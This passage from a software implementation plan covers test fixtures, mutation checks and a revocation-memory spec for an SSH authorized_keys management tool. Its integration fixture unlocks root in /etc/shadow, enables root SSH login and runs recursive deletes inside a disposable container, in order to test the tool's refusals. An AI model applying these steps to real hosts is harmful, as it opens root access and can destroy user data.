			if tt.probeIn != "" && !strings.Contains(lo.Probe.Error(), tt.probeIn) {
				t.Errorf("probe error = %q, want it to mention %q", lo.Probe, tt.probeIn)
			}
			if got := readFile(t, target); got != previous {
				t.Errorf("file = %q, want the pre-write bytes %q restored", got, previous)
			}
			assertNoResidue(t, target)
		})
	}
}
```
(`audit.ErrorKind` is `type ErrorKind string` at `internal/audit/errors.go:12`, and `ErrorKindOf` is at `:54`. `sshwrite_test.go` already imports `internal/audit`.)

- [ ] **Step 2: Run. Expect PASS on the current code:** `go test -race ./internal/sshwrite/ -run TestApplyHermeticProbeReadsWrittenFile -v`
- [ ] **Step 3: Mutation proof (scratch copy, as in Task 1 Step 7):**
  - (a) `perl -0pi -e 's/case code != 0 \|\| stdout.String\(\) != probeOutput:/case code != 0 || stdout.Len() < 0:/' internal/sshwrite/sshwrite.go` (it keeps `stdout` used, so the mutant compiles). The `forced command=` row must FAIL (Apply returns nil). The existing `TestApplyLoginProbeFailureRestores/forced_command…` row fails too.
  - (b) `perl -0pi -e 's/perr := w\.probe\(ctx, srv, req\.Survivors\)/perr := error(nil)/' internal/sshwrite/sshwrite.go`. Both lockout rows must FAIL.
  - (c) In `sshtest.go`, change `switch strings.ToLower(name)` to `switch strings.ToLower(name) + "-ignored"` (it keeps `name` used, so the mutant compiles). The command= and from= rows here, and in `sshtest_test.go`, must FAIL.
  - Every mutant must compile: a `[build failed]` run is not a mutation kill. Check that the failure is the intended test row, not a compile error.

---

#### Task 4 (Lane B): order-independent integration tests (TST-9). Do this first in Lane B, because it is the net for the other Lane B tasks.

**Files:** Modify `scripts/integration.sh` (`:121-127`) and `internal/sshwrite/integration_test.go`.

- [ ] **Step 1: Make the order dependency visible (failing first).** Replace `scripts/integration.sh:121-127` with:
```bash
export SSHEPHERD_IT_HOST=127.0.0.1 \
  SSHEPHERD_IT_PORT="$PORT" \
  SSHEPHERD_IT_KNOWN_HOSTS="$WORKDIR/known_hosts" \
  SSHEPHERD_IT_PUB="$WORKDIR/id_ed25519.pub" \
  SSHEPHERD_IT_KEYS="$WORKDIR"
# sshwrite's write tests mutate shared container users. Shuffled and run
# twice, they prove each test reseeds its own starting state (go test
# prints the -test.shuffle seed so a failure reproduces).
go test -race -tags=integration -run 'TestIntegration' -shuffle=on -count=2 -v ./internal/sshwrite/
go test -race -tags=integration -run 'TestIntegration|TestE2E' -v ./internal/sshread/ ./cmd/sshepherd/
```
(The `cmd/sshepherd` E2E flows are stateful by design and belong to P13. Do not shuffle them here.)

- [ ] **Step 2: Run. Expect FAIL:** `rtk proxy make integration`. The second iteration fails at least `TestIntegrationApplyFileAbsent` ("want no backup for a previously absent file"). `TestIntegrationApplyWriteBackupVerify` fails ("pre-apply seed … want the seeded 2-key drift" or the `.orig` mismatch) whenever a `writer` test ran before it. Record the seed and the failure lines.

- [ ] **Step 3: Implement `reseed`.** Add it after `itRequest` in `integration_test.go`:

```go
// fixture is a user's starting state. A nil field leaves that file absent.
type fixture struct {
	keys, keys2 *string
	clear       []string // extra $HOME-relative paths to remove (e.g. "keys.d")
}

func strp(s string) *string { return &s }

// itDrifted is the writer/e2e seed: the harness key plus a stale key that
// apply must remove. testkeys keeps it hermetic.
func itDrifted(t *testing.T) string { return itPub(t) + "\n" + testkeys.Line(t, 7) + "\n" }

// reseed puts srv's user back to f over that user's own connection. It
// removes every artifact a previous test or run left behind (.bak, .orig,
// temp, lock, the disabled authorized_keys2), so no test depends on run
// order. The trailing marker catches a forced command= left on the login
// key, which would otherwise turn the reseed into a silent no-op.
func reseed(t *testing.T, d *sshconn.Dialer, srv config.Server, f fixture) {
	t.Helper()
	put := func(name string, content *string) string {
		if content == nil {
			return `rm -f ` + name
		}
		return `printf '%s' ` + sshconn.ShQuote(*content) + ` > ` + name + `.new && mv -f ` + name + `.new ` + name
	}
	var b strings.Builder
	b.WriteString(`set -e; umask 077; cd "$HOME/.ssh"`)
	b.WriteString(`; rm -f authorized_keys` + bakSuffix + ` authorized_keys` + origSuffix + ` authorized_keys` + tmpSuffix + ` authorized_keys2` + Keys2DisabledSuffix)
	b.WriteString(`; rmdir authorized_keys` + lockSuffix + ` 2>/dev/null || :`)
	b.WriteString(`; ` + put("authorized_keys", f.keys) + `; ` + put("authorized_keys2", f.keys2))
	for _, c := range f.clear {
		b.WriteString(`; rm -rf "$HOME"/` + sshconn.ShQuote(c))
	}
	b.WriteString(`; echo reseeded`)
	if out := remoteOut(t, d, srv, b.String()); out != "reseeded\n" {
		t.Fatalf("reseed %s: output %q — a forced command on the login key?", srv.User, out)
	}
}
```

- [ ] **Step 4: Call `reseed` as the first action of each test that changes state.** Put it right after `srv` is built:

| Test (file:line) | Call |
|---|---|
| `TestIntegrationApplyWriteBackupVerify` (`:137`) | `reseed(t, w.Dialer, srv, fixture{keys: strp(itDrifted(t))})` |
| `TestIntegrationOrphanedTempReclaimed` (`:185`) | same as the row above |
| `TestIntegrationApplyDisablesAuthorizedKeys2` (`:421`) | same as the row above |
| `TestIntegrationApplyFileAbsent` (`:206`) | `reseed(t, w.Dialer, srv, fixture{keys2: strp(itPub(t) + "\n")})` |
| `TestIntegrationApplyCreatesOverrideDir` (`:229`) | `reseed(t, w.Dialer, srv, fixture{keys2: strp(itPub(t) + "\n"), clear: []string{"keys.d"}})` |
| `TestIntegrationChangedSincePlanRefused` (`:282`), `TestIntegrationConcurrentApplyLocked` (`:301`), `TestIntegrationVerifyFailure` (`:324`), `TestIntegrationInterruptedWriteLeavesOriginal` (`:344`), `TestIntegrationLoginProbeRestores` (`:400`) | `reseed(t, w.Dialer, srv, fixture{keys: strp(itPub(t) + "\n")})` |

Do **not** reseed `sym`. `mv` would replace its symlink, and the test changes nothing because the write is refused. Do not reseed the Task 5 ownership fixtures either: their directories are not writable by design, and refusals change nothing. In `TestIntegrationApplyWriteBackupVerify`, the existing `len(lines) != 2` precondition (`:143`) still holds. Keep it as a guard that the reseed worked.

- [ ] **Step 5: Run. Expect PASS:** `rtk proxy make integration`. Both iterations pass in shuffled order. Run it a second time to get a different seed.

---

#### Task 5 (Lane B): ownership-refusal fixtures against real sshd (TST-1)

**Files:** Modify `scripts/integration.sh` (the fixture block `:55-97`) and `internal/sshwrite/integration_test.go`.

- [ ] **Step 1: Add the fixtures to `integration.sh`.**
  - Append `fdir ffile fanc rootvictim probecmd probefrom probeok` to the user lists on lines 55 and 84. That is the `adduser` loop and the `chown -R`/`chmod` loop.
  - Add `fdir ffile fanc probecmd probefrom probeok` to the "agent key alone" `cp` loop on line 64.
  - After the chown loop (after line 88), add:
```sh
    # Ownership-refusal fixtures (TST-1). sshd's StrictModes accepts each
    # one (root may own a user's ~/.ssh or authorized_keys), so the user
    # can still log in. The write script must refuse each one with exit 48.
    # fdir: ~/.ssh owned by root. Refused at the directory check (root not exempt).
    chown root:root /home/fdir/.ssh && chmod 755 /home/fdir/.ssh
    # ffile: authorized_keys owned by root. Refused at the file check under the lock.
    chown root:root /home/ffile/.ssh/authorized_keys && chmod 644 /home/ffile/.ssh/authorized_keys
    # fanc: an authorized_keys_file override below ~/shared, which nobody owns.
    mkdir -p /home/fanc/shared/keys
    chown nobody:nobody /home/fanc/shared && chmod 755 /home/fanc/shared
    chown fanc:fanc /home/fanc/shared/keys && chmod 700 /home/fanc/shared/keys
    # root logs in with the agent key. rootvictim's file is the target root
    # must never write through.
    mkdir -p /root/.ssh && cp /seed/key.pub /root/.ssh/authorized_keys
    chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys
    sed -i "s|^root:!|root:*|" /etc/shadow
    cp /seed/stale.pub /home/rootvictim/.ssh/authorized_keys
    chown rootvictim:rootvictim /home/rootvictim/.ssh/authorized_keys && chmod 600 /home/rootvictim/.ssh/authorized_keys
```
  - Next to the `AuthorizedKeysFile` sed (line 97), add `sed -i "/^#*PermitRootLogin/d" /etc/ssh/sshd_config && echo "PermitRootLogin prohibit-password" >> /etc/ssh/sshd_config`. OpenSSH keeps the first occurrence, so delete any active line first.

- [ ] **Step 2: Write the test** in `integration_test.go`:

```go
// TestIntegrationOwnershipRefusals runs the write script's StrictModes-style
// owner checks (sshwrite.go:160-161, 199, 202) against real sshd fixtures.
// Each must refuse with *UnsafePathError and leave the target byte-identical,
// with no backup.
func TestIntegrationOwnershipRefusals(t *testing.T) {
	w, host, port := itWriter(t)
	tests := []struct{ name, user, akf string }{
		{"~/.ssh owned by root (directory check)", "fdir", ""},
		{"authorized_keys owned by root (file check)", "ffile", ""},
		{"ancestor owned by nobody (ancestor walk)", "fanc", "~/shared/keys/authorized_keys"},
		{"root writing into a user's directory", "root", "/home/rootvictim/.ssh/authorized_keys"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			srv := config.Server{Name: tt.user, Host: host, Port: port, User: tt.user, AuthorizedKeysFile: tt.akf}
			path := tt.akf
			if path == "" {
				path = sshconn.DefaultAuthorizedKeysPath
			}
			cat := sshconn.PathAssign(path) + `; cat "$p" 2>/dev/null || :`
			lsDir := sshconn.PathAssign(path) + `; ls -a "$(dirname "$p")" 2>/dev/null || :`
			before := remoteOut(t, w.Dialer, srv, cat)
			err := w.Apply(itCtx(t), srv, itRequest(t, w.Dialer, srv, itRendered(t)))
			var uns *UnsafePathError
			if !errors.As(err, &uns) {
				t.Fatalf("Apply = %v, want *UnsafePathError", err)
			}
			if got := remoteOut(t, w.Dialer, srv, cat); got != before {
				t.Errorf("target = %q, want it byte-identical to %q", got, before)
			}
			if ls := remoteOut(t, w.Dialer, srv, lsDir); strings.Contains(ls, ".sshepherd.") {
				t.Errorf("ls = %q, a refused write leaves no backup, temp or lock", ls)
			}
		})
	}
}
```

- [ ] **Step 3: Run. Expect PASS:** `rtk proxy make integration`. If the `root` row fails at `itSnapshot` with an auth error, check the login: `docker exec sshepherd-it grep -n PermitRootLogin /etc/ssh/sshd_config` and `docker exec sshepherd-it grep '^root:' /etc/shadow`. Fix the fixture. Do not drop the row.
- [ ] **Step 4: Mutation proof (scratch copy, run on its own, never in parallel with another integration run).** Take the integration lock first (`mkdir "$PATCH_DIR/it.lock" && echo "P03-B-mut $(date +%s)" > "$PATCH_DIR/it.lock/owner"`, released with `rm -r` afterwards; see Execution model), because the scratch copy uses the same fixed container name `sshepherd-it`, port 42222 and initial `docker rm -f`. In `$MUT` (Task 1 Step 7), run with all four owner checks removed: `cd "$MUT" && ./scripts/integration.sh`. Expect all four `TestIntegrationOwnershipRefusals` subtests to FAIL:
  - `fdir`: generic exit 1 at the lock `mkdir`, not `*UnsafePathError`.
  - `ffile`: Apply succeeds and replaces the root-owned file.
  - `fanc`: Apply succeeds.
  - `root`: root rewrites rootvictim's file.

  Then, on a **clean** copy, remove ONLY the file check (the 2nd occurrence of `if [ "$3" != "$u" ]; then exit 48; fi`, the same `replaceNth` index `TestOwnerChecksBite` uses for its `ffile` mutant, so the unit and integration mutants are the same). Expect: only the `ffile` row FAILs (Apply replaces the root-owned file); `fdir`, `fanc` and `root` still refuse with `*UnsafePathError`. This proves the file check is load-bearing on real sshd.

---

#### Task 6 (Lane B): login probe against real sshd (TST-3)

**Files:** Modify `internal/sshwrite/integration_test.go`. The fixture users `probecmd`, `probefrom` and `probeok` come from Task 5 Step 1.

- [ ] **Step 1: Write the test.**
```go
// TestIntegrationLoginProbeHonorsWrittenOptions: the post-write probe
// against real sshd. A survivor line that sshd will force to /bin/true, or
// refuse by source address, is a lockout. The probe restores the
// byte-identical pre-write file. A restrict-only survivor still runs
// the probe command (negative control).
func TestIntegrationLoginProbeHonorsWrittenOptions(t *testing.T) {
	w, host, port := itWriter(t)
	pub := itPub(t)
	tests := []struct {
		name, user, line string
		lockout          bool
	}{
		{"forced command= fails the probe and restores", "probecmd", `command="/bin/true" ` + pub, true},
		{"from= the client cannot match fails the login and restores", "probefrom", `from="10.255.255.1" ` + pub, true},
		{"restrict alone passes the probe (negative control)", "probeok", `restrict ` + pub, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			srv := config.Server{Name: tt.user, Host: host, Port: port, User: tt.user}
			reseed(t, w.Dialer, srv, fixture{keys: strp(pub + "\n")})
			before := remoteOut(t, w.Dialer, srv, `cat "$HOME/.ssh/authorized_keys"`)
			content := []byte(authkeys.ManagedHeader + "\n" + tt.line + "\n")
			err := w.Apply(itCtx(t), srv, itRequest(t, w.Dialer, srv, content))
			if !tt.lockout {
				if err != nil {
					t.Fatalf("Apply = %v, want success: restrict permits exec", err)
				}
				return // the next run's reseed puts the plain line back
			}
			var lo *LockoutError
			if !errors.As(err, &lo) || lo.Restore != nil {
				t.Fatalf("Apply = %v, want a restored *LockoutError", err)
			}
			if got := remoteOut(t, w.Dialer, srv, `cat "$HOME/.ssh/authorized_keys"`); got != before {
				t.Errorf("file = %q, want the pre-write bytes %q", got, before)
			}
		})
	}
}
```
- [ ] **Step 2: Run. Expect PASS:** `rtk proxy make integration`. The shuffled `-count=2` run also proves that `reseed` recovers `probeok` from its `restrict` line.
- [ ] **Step 3: Mutation proof.** In a fresh scratch copy, apply Task 3 Step 3's mutants (a) and (b) and run `./scripts/integration.sh` on its own. Mutant (a) must fail the `probecmd` row (Apply returns nil and `command="/bin/true"` stays installed). Mutant (b) must fail both lockout rows.

---

#### Task 7 (Integrator): merge, gates, docs, one commit

- [ ] Apply the Lane A diff, then the Lane B diff. Their files are disjoint, so there are no conflicts.
- [ ] Run `make check`. It must pass: fmt, vet, golangci-lint (note `gocritic`/`revive` on the test helpers), deadcode, gosec (the `#nosec` comments above carry reasons), and the coverage gate. `sshtest` gains covered code, so coverage can only go up.
- [ ] Run `rtk proxy make integration` twice, so two shuffle seeds both pass. Paste both seeds into the hand-off.
- [ ] **README:** no change needed. The "Test kinds" paragraph (`README.md:1503`) and the `make integration` line (`:1469`) stay accurate. Product behavior and flags are unchanged. Grep `README.md` for "integration" to confirm.
- [ ] **CLAUDE.md Status:** add one sentence. Write-script owner checks are pinned by a stubbed-`ls` unit matrix with a mutation self-test and by real-sshd ownership fixtures. The login probe is proven against real sshd and against `sshtest`'s new `AuthorizedKeysFile` mode. The `sshwrite` integration package runs shuffled and twice.
- [ ] Commit to master: `test(sshwrite): pin owner checks, prove the login probe on real sshd, make integration order-independent`. End with the attribution line. Agents never commit.
- [ ] Independent verifier: re-run the three scratch-copy mutation checks (Task 1 Step 7, Task 5 Step 4, Task 6 Step 3) from a clean tree, one at a time, and confirm each one FAILs as stated. Then run `make check` and `make integration` on master.

#### Risks and how they are verified

| Risk | Mitigation and check |
|---|---|
| busybox-static ignores the `PATH` stub, so its rows skip on GitHub runners | Same precedent as fb163d9. dash and bash --posix still run every row in CI. The skip names its reason. |
| The suite runs as root, so a "uid 0 is foreign" row means nothing | `runOwnerCase` skips when the stubbed uid equals `os.Getuid()`. |
| A future script rewrite (P11) changes the check text | `TestOwnerChecksBite` fails loudly ("occurrence … not found — update ownerMutants") instead of passing without checking anything. |
| Root login in the fixture | The container is thrown away and port-bound to 127.0.0.1. The root login exists only to prove the write script refuses. |
| `-count=2` doubles the sshwrite integration time | That is about 12 short tests over local Docker, a few seconds. The cmd/sshepherd run is unchanged. |
| Integration runs collide (fixed container name) | Only Lane B and then the integrator run it, and never at the same time. Scratch mutation runs are one at a time too. |

#### Acceptance

```bash
go test -race ./internal/sshconn/sshtest/ -v
go test -race ./internal/sshwrite/ -run 'TestWriteCmdThroughRealSh|TestRestoreCmdThroughRealSh|TestOwnerChecksBite|TestApplyHermeticProbeReadsWrittenFile' -v
make check
make integration            # includes: go test -race -tags=integration -shuffle=on -count=2 ./internal/sshwrite/
make integration            # second run, different shuffle seed
```
Plus the three scratch-copy mutation runs. Each FAILs as stated, and the verifier records the output.

#### Out of scope

- Any change to `internal/sshwrite/sshwrite.go` or other product code. This package is tests only. Write-script changes belong to P11 (Wave 2), which lands on top of this net.
- Shuffling or making the `cmd/sshepherd` E2E and identity integration tests order-independent (`e2e_test.go`, `identity_integration_test.go` belong to P13).
- A nobody-owned `~/.ssh` with a `Match User … AuthorizedKeysFile /etc/ssh/keys/%u` login path. Root-owned fixtures cover the same checks without changing sshd config. Add it later only if a test needs a non-root foreign owner on `~/.ssh` itself.
- OpenSSH-exact `from=` matching (CIDR, hostnames) in `sshtest`.
- Tests for `disableKeys2Cmd`'s ancestor walk. It shares `ancestorCheck` with the write and restore rows covered here.
- Anything touching the on-hold items (prune, apply --force, import --prefer, key generation and scheduled rotation, move-key, apply wipe mode). None of them overlaps this package.

---

### P04 — Spec: revocation memory and manifest authority (tombstones, post-revoke sweep, serial, adopt wildcard)

> **Program notes (master plan, revised by the review panel):** Spec only. The implementation is **W4** (after P14) and needs D28, D29, D1–D5, D4b, D1a, D1b, D1c, D2a, D4a, D4c, D1d and D1e. After P13 (W2), `make fuzz` discovers targets, so there is no Makefile edit: W4's acceptance checks `make fuzz-list | grep -q FuzzParseHeader`. Panel changes folded in below: exit 2 follows the shared contract (D28); manifest policy conflicts are reported, not load errors (D29); the sweep becomes opt-in and also reads `authorized_keys2` (D3); removal-only plans are never blocked by a server serial and absurd serials count as forged (D4); hand edits that remove keys bump the serial (D4b); a repeated revoke is idempotent (D1c).

- **Kind:** spec (design doc + owner decisions only; no code, no tests, no README change in this package)
- **Wave:** 0 (spec written now). Implementation is **W4**, after P05, P06, P07, P11, P12 and P14 (W3) have landed.
- **depends_on:** none for the spec. The implementation depends on the owner answers listed in the program notes and on waves 1–3 being merged (see Conflicts).
- **Files owned (this package):** `docs/superpowers/specs/2026-11-08-revocation-memory-design.md` (new). That is the only file touched.

#### Findings covered

| ID | Sev | One line |
|---|---|---|
| PRD-1 | HIGH | Revocation has no memory. After `revoke`, nothing records the fingerprint, so `adopt --merge` re-adopts a leftover copy as a new user or extends the old owner (`internal/adopt/adopt.go:76-104`), and audit shows it only as a generic `(unknown) … UNAUTHORIZED` at exit 1 (`internal/audit/report.go:129-133`). |
| SEC-2 | LOW | `revoke` exits 0 while the revoked key is still installed on servers outside the affected set (`internal/apply/affected.go:27-40`, `cmd/sshepherd/editrun.go:377-380`). The only safeguard is the `scope:` hint (`editrun.go:383-386`). |
| PRD-2 | MEDIUM | The managed header is a fixed string (`internal/authkeys/render.go:11-14`), so a server cannot tell which manifest generation wrote it, and an `apply --yes` from a stale checkout silently re-grants revoked keys. The code admits this in `editrun.go:168` (`defaultSaveNote`) and `revoke.go:232`. |
| SEC-3 | LOW | adopt compacts an unknown key found on every server of a fleet of 2+ servers to `servers: ["*"]` (`internal/adopt/adopt.go:180-184`, rendered at `cmd/sshepherd/adopt.go:57-60` and `:100-103`), which grants a possibly planted key on every future server. |

#### Grounding: what the code does today

- **Manifest top level is closed.** `config.Config` has only `users`/`servers`/`access` (`internal/config/config.go:56-70`, `KnownFields(true)` at `:86`). `manifest.checkTopLevelKeys` also refuses any other top-level key as an `UnsupportedError` (`internal/manifest/manifest.go:143-159`). Both `revoked:` and `serial:` therefore need a change in **both** gates, or `revoke` cannot edit a manifest that has them.
- **Ownership is the only identity.** `validateUsers` builds `owners` by fingerprint (`config.go:146-158`). `OwnerOf` (`:511-514`) is what adopt (`adopt.go:77`), reconcile (`internal/reconcile/reconcile.go:192`), audit labels (`report.go:229-238`) and revoke (`revoke.go:174-177`) all consult. Once a key is removed it is indistinguishable from a stranger's key.
- **Revoke never rejects a save because of the fleet.** It saves before the first write (`editrun.go:239-251`), and unreachable or refused servers "can converge later" (`editrun.go:411-424`). A sole-grantee server is refused, and the key **stays** there (`internal/apply/plan.go:170-187`, README.md:997-1000). Nothing remembers that the key should be gone.
- **`revoke --key` of an unowned fingerprint is refused** (`revoke.go:174-177`). It points to `apply`, but nothing names the key as revoked.
- **The header is used in three places:** `render.go:53-57` writes it, `apply/plan.go:296` skips it when counting non-key lines, and the remote write script decides whether to take the one-time `.orig` backup with an **exact** first-line compare against `authkeys.ManagedHeader` (`internal/sshwrite/sshwrite.go:205-206`). A variable header breaks that compare.
- **Affected scope is a rendered-bytes diff** (`apply/affected.go:27-51`). If a serial is rendered into the header and is part of that diff, **every** server becomes "affected" by every revoke. The spec must exclude the header from both `Affected` and convergence (see the sketch).
- **adopt has two write paths.** Regenerate mode rebuilds the manifest from structs (`cmd/sshepherd/adopt.go:25-77` through `manifestOut` in `cmd/sshepherd/manifest_out.go:27-45`), which would **silently drop** `revoked:` and `serial:` unless `manifestOut` round-trips them. `--merge` appends through `internal/manifest` (`adopt.go:79-117`).
- **Import's wildcard** (`cmd/sshepherd/import.go:100-106`, `reconcile.go:307-311`) comes from the operator's own ssh config, not from remote content. SEC-3/D5 is about adopt only. Import is listed under Out of scope.

#### Design questions (ask ONE at a time, short English, recommendation first)

The questions are the master list's Block 1 (Owner decisions, top of this plan), asked one at a time in that order: **D28 → D1 → D29 → D2 → D3 → D4 → D4b → D5 → D1a → D1b → D1c → D2a → D4a → D4c → D1d → D1e**. The spec records each answer with its date. This table repeats them in the spec's wording; the plain-English versions in Block 1 are what the owner hears.

| # | Question | Recommendation | Why |
|---|---|---|---|
| **D28** | What should exit 2 mean for apply, revoke and rotate? | **A human must act now on security, same as audit** (revoked key still installed and seen; lockout not undone) | One meaning across commands; the README row "apply, revoke and rotate never return 2" is rewritten once, from one table. |
| **D1** | Should the manifest remember keys you revoked? | **Yes: a `revoked:` list in the manifest** | It keeps a single source of truth, and git shows every revoke. |
| **D29** | When the manifest itself breaks a rule (a revoked key still listed, a hand grant over a revoked server, a weak key), should every command stop, or should audit report it? | **audit loads the manifest and reports each conflict as critical (exit 2); apply skips only the keys or servers involved; `validate` and the commands that save the manifest refuse** | One bad line must never blind a scheduled audit (exit 3 reports nothing about the fleet). Asked once; D1, D1a and D19 follow it. |
| **D2** | A revoked key is still on a server. How loud should audit be? | **Critical, exit 2** | A revoked key that still works is what monitoring must page on. |
| **D3** | After a revoke, should SSHepherd log in to every server to check the key is gone? Cost: every revoke contacts the whole fleet, one unreachable server makes it exit 1, and it can't run with `--no-apply`. | **Only with `--sweep`; without it, print the exact `sshepherd audit` command** (D2 makes that audit page-worthy) | A scheduled audit already pages on a revoked key; a fleet-wide login on every revoke mostly duplicates it. |
| **D4** | Should the manifest carry a serial so an old copy cannot undo newer revokes? Limits: only revoke/rotate (and D4b) bump it; the escape hatch is editing `serial:` yourself; two branches can reach the same number. | **Yes, apply refuses a newer server serial except for plans that only remove keys; absurd serials count as forged** | This keeps it clear of `apply --force` while no header can ever stop a removal. Option (2), warn only, is the lighter alternative. |
| **D4b** | A hand edit that removes a key does not bump the serial. Should apply bump it when a confirmed write removes keys and the serial did not go up? | **Yes, saved through the manifest store** | Otherwise the normal GitOps edit leaves stale copies able to re-grant (PRD-2's scenario). Cost: apply then writes the manifest file. |
| **D5** | adopt finds an unknown key on every server. Should it write `["*"]`? | **No, always list the servers by name** | An unknown key should never reach servers that do not exist yet. |
| **D1a** | `revoke bob --server db-1` leaves no trace, so a later `adopt --merge` gives db-1 back. Remember that too? | **Yes: a `revoked:` entry with `user` + `servers` (no fingerprint); adopt and import never re-extend it; a hand grant over it is a D29 conflict** | It is the same hole as PRD-1, for one server instead of a whole key. A wildcard grant already gets `except:` (`internal/manifest/edit.go:346-377`). |
| **D1b** | `revoke --key` of a key no user has any more is refused today. Should it record the revoke instead? | **Yes: record it; it writes no server and prints the `audit` (or, with `--sweep`, the sweep) result** | Incident response can then name a stray key. No new delete path, so this is not `prune`. |
| **D1c** | Re-running a revoke for someone already revoked: exit 0 with the apply hint? | **Yes, using the `revoked:` list to know they were revoked** | Fixes the rest of UX-6 (a retry exits 3 today) and makes `revoke USER` and `revoke --key` agree on retry. |
| **D2a** | When adopt finds a revoked key, what should happen to the run? | **Skip the key and print a loud warning. adopt's exit code is unchanged (D8/P12 owns adopt's exit codes).** | audit is the monitoring surface. adopt only proposes a manifest. |
| **D4a** | Audit sees a server written by a *newer* manifest than the one you are using. What should audit say? | **A note on that server, counted as drift (exit 1), naming both serials** | An audit against a stale manifest proves nothing, but it is not a security alarm. Absurd serials are D4's "forged" case (exit 2). |
| **D4c** | apply meets a newer-serial server whose body already equals yours: exit 0 or 1? | **Converged, exit 0, with the pull-the-latest note** | Nothing would change; audit still reports it (D4a). |
| **D1d** | audit finds a key installed where an access tombstone removed it: drift or critical? | **Drift, exit 1, labelled `(access revoked DATE)`** | The user is still trusted elsewhere; critical stays for revoked keys (D2). |
| **D1e** | An access tombstone names a server no longer in `servers:`: load error or warning? | **Load error (exit 3)** | A typo in a tombstone must never silently protect nothing. |

#### Recommended design sketch (what the spec doc should say)

**1. Schema (D1, D1a, D4).**

```yaml
serial: 7                    # optional; absent = 0. Integer 0..2^53-1. Only revoke/rotate bump it.
users: [...]
servers: [...]
access: [...]
revoked:                     # optional, append-only by tooling; hand-deleting an entry = deliberate un-revoke
  - fingerprint: SHA256:abc…       # key tombstone (D1)
    user: alice                    # label only (former owner); not required to exist
    date: 2026-11-08               # YYYY-MM-DD, required
    reason: offboarded             # optional free text
  - user: bob                      # access tombstone (D1a): no fingerprint
    servers: [db-1]
    date: 2026-11-08
```

Validation, added to `internal/config` (new `revoked.go`, wired from `validate()` at `config.go:104-110`):
- An entry with `fingerprint` must look like `SHA256:` plus unpadded base64 of 43 characters. `servers` is forbidden on it and duplicate fingerprints are an error (shape errors stay load errors). A fingerprint that any user still lists is a **policy conflict** (D29), not a load error: `key SHA256:… of user "alice2" is revoked (2026-11-08, alice): remove it from users, or delete the revoked: entry to un-revoke it deliberately`. Operators get no exception.
- An entry without `fingerprint` needs `user` and a non-empty `servers` of known names (no `*`). An explicit (non-wildcard) grant that covers one of those servers is a **policy conflict** (D29).
- **Policy conflicts (D29):** `config.Parse` returns them in `(*Config).Conflicts() []Conflict` instead of failing. `audit` reports each as critical (exit 2) on the affected servers; `apply` refuses the servers the conflict applies to (writes nothing there, reports the conflict text, never installs a revoked key) and plans the rest; `validate` (D25) and every command that **saves** the manifest (revoke, rotate, adopt `--merge`, import `--merge`) refuse with the conflict text (exit 3).
- `user`/`reason` must pass `authkeys.RenderTextIssue`, because they are printed, and are capped at 256 bytes. `date` must parse as `2006-01-02`.
- `serial` must be an integer ≥ 0 (a negative value or a string is a parse error).
- New accessors: `(*Config).Revoked(fp string) (Tombstone, bool)`, `(*Config).AccessRevoked(user, server string) bool`, and `(*Config).Serial() uint64`.

`internal/manifest`: `checkTopLevelKeys` allows `serial` and `revoked` (`manifest.go:153-154`). New edits are `AddTombstones([]TombstoneEntry)` (append, creating the section at the end) and `BumpSerial() (uint64, error)` (creates `serial: 1` as the first top-level key when absent). Both are comment-preserving and run in the same single `Encode` (`editrun.go:170-182`).

**2. Managed header carries the serial (D4).**
- `authkeys.Render(entries, serial uint64)`. With `serial == 0` the output is the **existing header, byte for byte**, so fleets that never revoke see no churn on upgrade. With `serial > 0` the header is `# Managed by SSHepherd (serial 7). Manual edits will be overwritten by 'sshepherd apply'.`
- New `authkeys.ParseHeader(firstLine string) (serial uint64, managed bool)`. It uses a strict regexp (`^# Managed by SSHepherd(?: \(serial ([1-9][0-9]{0,15})\))?\. Manual edits …$`), handles remote-controlled input, and gets a fuzz target.
- Convergence and scope ignore the header. In `apply/plan.go:213-221`, "same" means equal **bodies** (lines after a managed header) **and** a header serial ≥ … see the table below. `Affected` (`affected.go:45-51`) renders with serial 0 on both sides, so a serial bump never widens the affected set.
- `sshwrite.go:205-206` replaces the exact compare with a prefix test (`case "$(head -n 1 "$p")" in '# Managed by SSHepherd'*) ;; *) take .orig ;; esac`). `plan.go:296` uses `ParseHeader`.

| server header serial S vs manifest serial M | body equal | plan |
|---|---|---|
| S > M + 1000 | any | **Forged header**: audit is critical (exit 2) `header claims serial S, far above this manifest's M — someone edited this file`; apply treats the server as having no serial (rows below) and warns, so an attacker's header can never block a write. |
| M < S ≤ M + 1000 | any, and the rendered body **only removes keys** compared with the server's body | **Proceeds with M and a warning** (`written by newer manifest serial S; this write only removes keys, so it proceeds`). Removing keys can never re-grant anything, so no header can stop an emergency revoke. |
| M < S ≤ M + 1000 | otherwise | **Refused**: `written by manifest serial S, this manifest is M — a newer manifest revoked or rotated keys here; pull the latest manifest, or if you are sure, set serial: S in your manifest (this is the only override)` |
| S == M | yes | converged |
| S < M or no serial | yes | converged (no header-only write; the next real change carries M) |
| S ≤ M | no | change (rendered with M) |

Only servers that the bump actually changed (the affected set) carry the new serial, and those are exactly the servers a stale copy would re-grant on. Divergent branches that each bumped to the same S cannot be told apart. The spec records this as a known limitation, and git discipline remains the control for that case. A content hash was rejected as noise. The refusal message names the honest escape hatch (editing `serial:`), because that is what an operator would do anyway.

**3. Revoke and rotate write memory and bump the serial (D1, D4).**
- `planRevokeUsers` (`revoke.go:133-162`): one tombstone per removed key `{fp, user, date, reason}`. `planRevokeKeys` (`:168-218`): one per key. `planRevokeAccess` (`:224-252`) adds a D1a access tombstone for servers on an explicit list. A server that gains `except:` needs none. Plain `rotate` (`rotate.go:144-146`) tombstones the old key with `reason: rotated out`. `rotate --keep-old` tombstones nothing until the finishing `revoke --key`.
- Every revoke and rotate calls `BumpSerial` once.
- **D4b (hand edits):** when a confirmed `apply` writes a body that removes keys compared with the server's current body, and the manifest's serial is not above the server's header serial, apply bumps `serial:` once (through P12's `manifest.Store`, under its lock and compare-and-swap, saved after the prompt and before the first write, like revoke) and renders the new serial. A piped `--config` cannot be saved, so apply warns `removing keys without a serial bump: an older copy could re-grant them` and proceeds.
- **D1c (idempotent revoke):** `revoke USER` where USER is not in `users:` but has a key tombstone with `user: USER` exits 0 with `USER was already revoked (DATE); run 'sshepherd apply' to converge any server that still has the key` (the P06 apply hint, with the run's flags). A name that was never revoked keeps today's exit 3.
